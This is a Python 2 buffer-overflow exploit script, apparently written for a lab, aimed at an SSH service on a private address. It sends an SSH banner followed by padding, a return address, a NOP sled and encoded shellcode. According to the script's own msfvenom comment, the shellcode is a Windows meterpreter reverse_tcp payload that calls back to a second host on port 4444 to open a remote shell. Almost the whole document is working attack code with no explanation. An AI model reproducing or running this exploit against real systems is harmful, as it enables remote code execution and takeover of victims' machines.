#!/usr/bin/python

import socket, sys
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(("172.16.73.129", 22))

message = sock.recv(1000)

print message

#msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.73.128 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f c
shellcode = ("\xba\x49\x6d\x0e\x0f\xd9\xe5\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x54\x31\x53\x13\x03\x53\x13\x83\xeb\xb5\x8f\xfb\xf3\xad\xd2"
"\x04\x0c\x2d\xb3\x8d\xe9\x1c\xf3\xea\x7a\x0e\xc3\x79\x2e\xa2"
"\xa8\x2c\xdb\x31\xdc\xf8\xec\xf2\x6b\xdf\xc3\x03\xc7\x23\x45"
"\x87\x1a\x70\xa5\xb6\xd4\x85\xa4\xff\x09\x67\xf4\xa8\x46\xda"
"\xe9\xdd\x13\xe7\x82\xad\xb2\x6f\x76\x65\xb4\x5e\x29\xfe\xef"
"\x40\xcb\xd3\x9b\xc8\xd3\x30\xa1\x83\x68\x82\x5d\x12\xb9\xdb"
"\x9e\xb9\x84\xd4\x6c\xc3\xc1\xd2\x8e\xb6\x3b\x21\x32\xc1\xff"
"\x58\xe8\x44\xe4\xfa\x7b\xfe\xc0\xfb\xa8\x99\x83\xf7\x05\xed"
"\xcc\x1b\x9b\x22\x67\x27\x10\xc5\xa8\xae\x62\xe2\x6c\xeb\x31"
"\x8b\x35\x51\x97\xb4\x26\x3a\x48\x11\x2c\xd6\x9d\x28\x6f\xbe"
"\x52\x01\x90\x3e\xfd\x12\xe3\x0c\xa2\x88\x6b\x3c\x2b\x17\x6b"
"\x43\x06\xef\xe3\xba\xa9\x10\x2d\x78\xfd\x40\x45\xa9\x7e\x0b"
"\x95\x56\xab\xa6\x90\xc0\xf8\x27\xd2\x90\x69\x4a\xe4\x81\x35"
"\xc3\x02\xf1\x95\x83\x9a\xb1\x45\x64\x4b\x59\x8c\x6b\xb4\x79"
"\xaf\xa1\xdd\x13\x40\x1c\xb5\x8b\xf9\x05\x4d\x2a\x05\x90\x2b"
"\x6c\x8d\x11\xcb\x22\x66\x53\xdf\x52\x17\x9b\x1f\xa2\xb2\x9b"
"\x75\xa6\x14\xcb\xe1\xa4\x41\x3b\xae\x57\xa4\x3f\xa9\xa7\x39"
"\x76\xc1\x91\xaf\x36\xbd\xdd\x3f\xb7\x3d\x8b\x55\xb7\x55\x6b"
"\x0e\xe4\x40\x74\x9b\x98\xd8\xe0\x24\xc9\x8d\xa3\x4c\xf7\xe8"
"\x83\xd2\x08\xdf\x90\x15\xf6\x9d\xb4\xbd\x9f\x5d\xf8\x3d\x60"
"\x34\xf8\x6d\x08\xc3\xd7\x82\xf8\x2c\xf2\xca\x90\xa7\x92\xb9"
"\x01\xb7\xbf\x1c\x9c\xb8\x33\x85\xc9\x36\xb4\x3a\xf6\xb8\x89"
"\xec\xcf\xce\xca\x2c\x74\xc0\x61\x10\xdd\x4b\x89\x06\x1d\x5e")

buffer = ("\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48"
"\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde")
buffer += "A"*1055
buffer += "B"*4
buffer += "\x53\x93\x42\x7e"
buffer += "\x90"*5000
buffer += shellcode
buffer += "C"*22000
buffer += "\r\n"

sock.send(buffer)
time.sleep(5)
sock.close()
